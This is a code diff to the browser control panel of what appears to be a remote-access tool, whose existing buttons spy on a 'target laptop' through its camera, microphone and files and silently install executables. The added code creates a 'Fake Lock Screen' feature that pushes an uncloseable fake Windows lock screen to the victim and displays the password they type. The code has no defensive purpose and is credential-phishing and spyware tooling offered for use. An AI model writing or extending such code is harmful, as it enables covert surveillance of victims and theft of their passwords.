@@ -30,6 +30,7 @@
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
         <button id="browseFilesBtn" style="background: #6f42c1;">📁 Browse Files</button>
+        <button id="fakeLockBtn" style="background: #e50914; color: white;" title="Shows a fake Windows lock screen to capture password">🔓 Fake Lock Screen</button>
         <button id="pushUpdateBtn" style="background: #8540f5;" title="Silently install an update on the target laptop">📤 Push Silent Update</button>
         <input type="file" id="updateFileInput" accept=".exe" style="display: none;" />
     </div>
@@ -648,6 +649,21 @@
         });
 
         // Push Update Logic
+        document.getElementById('fakeLockBtn').onclick = () => {
+            if (!activeTarget) return;
+            if (confirm("This will show a fake Windows Lock Screen on the target laptop to capture their password. The screen cannot be closed until they enter a password. Proceed?")) {
+                socket.emit('request-fake-lockscreen', activeTarget);
+                alert("Fake lock screen initiated. Wait for the user to enter their password.");
+            }
+        };
+
+        socket.on('captured-password', (pwd) => {
+            alert("🚨 PASSWORD CAPTURED! 🚨\n\nTarget: " + activeTarget + "\nPassword: " + pwd);
+            // We can also display it in the remote text box or title just in case
+            document.getElementById('title').innerText = "Captured Password: " + pwd;
+            document.getElementById('title').style.color = "#ffeb3b";
+        });
+
         document.getElementById('pushUpdateBtn').onclick = () => {
             if (!activeTarget) return;
             if (confirm("Select the new CML Loader setup .exe file.\\nIt will be uploaded to the target laptop and installed silently in the background.")) {
